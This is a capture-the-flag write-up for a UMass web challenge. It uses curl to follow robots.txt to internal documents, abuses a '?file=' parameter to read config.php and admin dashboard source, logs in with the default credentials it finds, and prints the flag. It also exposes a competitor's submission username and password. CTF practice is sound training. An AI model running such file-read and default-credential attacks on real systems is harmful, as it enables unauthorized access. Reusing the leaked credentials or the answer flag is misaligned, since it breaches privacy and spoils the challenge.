# Brick_by_Brick_Web

## Challenge Summary
- Given: a live web app at `http://brick-by-brick.web.ctf.umasscybersec.org:48000` with the prompt to find a hidden admin dashboard.
- Goal: recover the flag from the admin dashboard.
- Constraints: remote-only challenge, no provided files.

## Initial Recon / Triage
- Observations: the landing page is static, but `robots.txt` exposes several internal documents under `/internal-docs/`.
- File identification: the onboarding document states that the main portal accepts a `?file=` parameter and that admin credentials are stored in `config.php` in the web root.
- Entry points: the undocumented file-read functionality at `/?file=...`.

## Hypotheses & Approach
- Hypothesis 1: the `?file=` parameter allows arbitrary reads from `/var/www/html/`.
- Hypothesis 2: reading `config.php` or the hidden dashboard source will reveal the admin path, credentials, or the flag directly.

## Execution Steps (Reproducible)

### Stage 1
Commands:
```bash
/usr/bin/curl -sS http://brick-by-brick.web.ctf.umasscybersec.org:48000/robots.txt
/usr/bin/curl -sS 'http://brick-by-brick.web.ctf.umasscybersec.org:48000/internal-docs/it-onboarding.txt'
```

Results:
- `robots.txt` disclosed `/internal-docs/assembly-guide.txt`, `/internal-docs/it-onboarding.txt`, and `/internal-docs/q3-report.txt`.
- `it-onboarding.txt` explicitly said staff can access any file using the `?file=` parameter and referenced `config.php` in the web root.

### Stage 2
Commands:
```bash
/usr/bin/curl -sS 'http://brick-by-brick.web.ctf.umasscybersec.org:48000/?file=config.php'
/usr/bin/curl -sS 'http://brick-by-brick.web.ctf.umasscybersec.org:48000/?file=dashboard-admin.php'
```

Results:
- `config.php` revealed the hidden admin dashboard path: `/dashboard-admin.php`.
- `dashboard-admin.php` source disclosed hardcoded default credentials:
	`administrator:administrator`
- The same source also contained the flag constant:
	`UMASS{4lw4ys_ch4ng3_d3f4ult_cr3d3nt14ls}`

### Stage 3
Commands:
```bash
url='http://brick-by-brick.web.ctf.umasscybersec.org:48000/dashboard-admin.php'
/usr/bin/curl -sS -c /tmp/brick_by_brick_web.cookies "$url" >/dev/null
/usr/bin/curl -sS -b /tmp/brick_by_brick_web.cookies -c /tmp/brick_by_brick_web.cookies \
	-d 'username=administrator&password=administrator' "$url" \
	| /usr/bin/grep -o 'UMASS{[^}]*}'

cd /root/umass2026CTF
/usr/bin/python3 tools/submit_flag.py \
	--username zeekliviu \
	--password umasscybersecebaza \
	--challenge-id 15 \
	--flag 'UMASS{4lw4ys_ch4ng3_d3f4ult_cr3d3nt14ls}'
```

Results:
- Logging in with the default credentials returned the same flag from the live dashboard.
- Submission status was `correct`.

## Artifacts Produced
- `artifacts/recon.txt` with the key leaked documents and source snippets.

## Flag
```
UMASS{4lw4ys_ch4ng3_d3f4ult_cr3d3nt14ls}
```
